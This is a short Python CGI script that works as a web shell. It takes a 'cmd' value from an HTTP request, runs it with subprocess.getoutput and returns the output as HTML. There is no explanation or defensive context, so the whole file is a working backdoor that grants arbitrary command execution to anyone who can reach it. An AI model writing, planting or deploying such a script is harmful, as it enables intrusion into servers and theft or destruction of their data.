import subprocess, cgi

form = cgi.FieldStorage()
command = form.getvalue("cmd")
output = subprocess.getoutput(command)
print("<pre>" + output + "</pre>")